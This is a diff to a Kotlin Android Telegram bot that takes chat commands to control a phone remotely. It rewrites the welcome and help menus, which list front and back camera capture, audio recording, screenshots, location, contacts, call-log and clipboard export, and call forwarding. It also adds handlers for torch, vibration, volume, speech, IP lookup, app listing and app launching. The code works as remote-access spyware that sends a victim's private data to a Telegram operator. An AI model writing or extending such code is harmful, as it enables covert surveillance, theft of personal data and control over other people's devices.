@@ -3,6 +3,7 @@ package com.example.telegrambot.handlers
 import android.content.Context
 import com.example.telegrambot.data.MessageEntity
 import com.example.telegrambot.data.MessageType
+import com.example.telegrambot.helpers.AdvancedControlHelper
 import com.example.telegrambot.network.TelegramApi
 import com.example.telegrambot.utils.Preferences
 import kotlinx.coroutines.*
@@ -41,19 +42,20 @@ object MessageHandler {
         val args = message.content.split(" ").drop(1)
 
         when (command) {
-                        "/start" -> {
+            "/start" -> {
                 val welcome = """
-                    🤖 *Welcome to Telegram Bot!*
+                    🤖 *Welcome to PhoneTelegramBot!*
                     
-                    I'm your personal assistant. Here's what I can do:
-                    • /camera - Take photo from back camera
-                    • /gallery - List recent photos from gallery
-                    • /status - Get device battery and storage status
-                    • /record - Record 40 seconds of audio
-                    • /screenshot - Capture a snapshot of the current screen
-                    • /contacts - Get contacts list
-                    • /location - Get current device location
-                    • /clipboard - Get current clipboard text
+                    Your personal remote control assistant.
+                    
+                    *Quick Start*
+                    /help - Full list of commands
+                    /status - Device status overview
+                    /camera - Take a photo
+                    
+                    *Popular*
+                    /screenshot • /location • /record
+                    /torch • /vibrate • /volume
                 """.trimIndent()
                 TelegramApi.sendMessage(token, chatId, welcome, "Markdown")
             }
@@ -61,14 +63,41 @@ object MessageHandler {
                 val help = """
                     📋 *Available Commands*
                     
-                    /camera - Take photo from back camera
-                    /gallery - List recent photos from gallery
-                    /status - Get device battery and storage status
-                    /record - Record 40 seconds of audio
-                    /screenshot - Capture a snapshot of the current screen
-                    /contacts - Get contacts list
-                    /location - Get current device location
-                    /clipboard - Get current clipboard text
+                    *📷 Media & Capture*
+                    /camera or /camera_back - Back camera photo
+                    /camera_front - Front camera photo
+                    /screenshot - Capture current screen
+                    /record - Record 40s audio
+                    /gallery - Recent gallery photos
+                    
+                    *📍 Device Info*
+                    /status - Full device status
+                    /location - Current GPS location
+                    /ip - Local + Public IP
+                    /uptime - Device uptime
+                    /info - Bot information
+                    /time - Current device time
+                    
+                    *📂 Data*
+                    /contacts - Export contacts
+                    /call_log - Export call logs
+                    /clipboard - Read clipboard
+                    
+                    *🎛️ Advanced Controls*
+                    /torch or /flashlight - Toggle flashlight
+                    /vibrate [ms] - Vibrate device (default 1000ms)
+                    /volume - Show volume levels
+                    /volume <0-100> - Set media volume
+                    /toast <message> - Show toast on phone
+                    /speak <text> - Speak text (TTS)
+                    /apps - List installed user apps
+                    /open <package|name> - Open an app
+                    /ring - Make the phone ring
+                    /forward <number> - Setup call forwarding
+                    
+                    *Misc*
+                    /ping - Check if bot is alive
+                    /echo <text> - Echo message
                 """.trimIndent()
                 TelegramApi.sendMessage(token, chatId, help, "Markdown")
             }
@@ -89,8 +118,8 @@ object MessageHandler {
                 }
             }
             "/gallery" -> {
-                val message = com.example.telegrambot.helpers.GalleryHelper.getRecentGalleryPathsMessage(context, limit = 5)
-                TelegramApi.sendMessage(token, chatId, message)
+                val msg = com.example.telegrambot.helpers.GalleryHelper.getRecentGalleryPathsMessage(context, limit = 5)
+                TelegramApi.sendMessage(token, chatId, msg)
             }
             "/camera_front" -> {
                 TelegramApi.sendMessage(token, chatId, "📸 Taking front photo...")
@@ -195,6 +224,87 @@ object MessageHandler {
                     TelegramApi.sendMessage(token, chatId, msg, "Markdown")
                 }
             }
+
+            // ─────────────── Advanced Features ───────────────
+
+            "/torch", "/flashlight" -> {
+                val result = AdvancedControlHelper.toggleTorch(context)
+                TelegramApi.sendMessage(token, chatId, result, "Markdown")
+            }
+            "/vibrate" -> {
+                val duration = args.firstOrNull()?.toLongOrNull() ?: 1000L
+                val result = AdvancedControlHelper.vibrate(context, duration.coerceIn(100, 10000))
+                TelegramApi.sendMessage(token, chatId, result)
+            }
+            "/volume" -> {
+                if (args.isEmpty()) {
+                    val info = AdvancedControlHelper.getVolumeInfo(context)
+                    TelegramApi.sendMessage(token, chatId, info, "Markdown")
+                } else {
+                    val percent = args[0].toIntOrNull()
+                    if (percent != null) {
+                        val result = AdvancedControlHelper.setMediaVolume(context, percent)
+                        TelegramApi.sendMessage(token, chatId, result)
+                    } else {
+                        TelegramApi.sendMessage(token, chatId, "Usage: /volume or /volume <0-100>")
+                    }
+                }
+            }
+            "/toast" -> {
+                val text = args.joinToString(" ")
+                if (text.isNotEmpty()) {
+                    val result = AdvancedControlHelper.showToast(context, text)
+                    TelegramApi.sendMessage(token, chatId, result)
+                } else {
+                    TelegramApi.sendMessage(token, chatId, "Usage: /toast <message>")
+                }
+            }
+            "/speak" -> {
+                val text = args.joinToString(" ")
+                if (text.isNotEmpty()) {
+                    val result = AdvancedControlHelper.speak(context, text)
+                    TelegramApi.sendMessage(token, chatId, result)
+                } else {
+                    TelegramApi.sendMessage(token, chatId, "Usage: /speak <text>")
+                }
+            }
+            "/ip" -> {
+                TelegramApi.sendMessage(token, chatId, "🌐 Fetching IP addresses...")
+                val local = AdvancedControlHelper.getLocalIp()
+                val publicIp = AdvancedControlHelper.getPublicIp()
+                val msg = """
+                    🌐 *IP Addresses*
+                    
+                    • Local: `$local`
+                    • Public: `$publicIp`
+                """.trimIndent()
+                TelegramApi.sendMessage(token, chatId, msg, "Markdown")
+            }
+            "/uptime" -> {
+                val result = AdvancedControlHelper.getUptime()
+                TelegramApi.sendMessage(token, chatId, result)
+            }
+            "/apps" -> {
+                TelegramApi.sendMessage(token, chatId, "📱 Fetching installed apps...")
+                val result = AdvancedControlHelper.getInstalledApps(context)
+                if (result.length > 4000) {
+                    result.chunked(4000).forEach { chunk ->
+                        TelegramApi.sendMessage(token, chatId, chunk, "Markdown")
+                    }
+                } else {
+                    TelegramApi.sendMessage(token, chatId, result, "Markdown")
+                }
+            }
+            "/open" -> {
+                val target = args.joinToString(" ")
+                if (target.isNotEmpty()) {
+                    val result = AdvancedControlHelper.openApp(context, target)
+                    TelegramApi.sendMessage(token, chatId, result, "Markdown")
+                } else {
+                    TelegramApi.sendMessage(token, chatId, "Usage: /open <package name or app name>\nExample: /open com.android.chrome")
+                }
+            }
+
             else -> {
                 TelegramApi.sendMessage(
                     token, chatId,
